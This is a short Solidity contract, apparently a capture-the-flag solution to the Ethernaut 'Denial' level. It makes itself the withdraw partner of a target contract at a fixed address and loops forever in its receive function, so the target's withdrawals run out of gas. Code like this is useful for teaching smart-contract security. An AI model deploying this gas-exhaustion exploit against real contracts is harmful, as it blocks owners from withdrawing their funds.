// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../instances/Ilevel20.sol";

contract DenialHack {
    Denial level20 = Denial(0x1bd442053Af3e571eBbe11809F3cd207A0466A45);

    constructor() public {
        level20.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) {}
    }
} 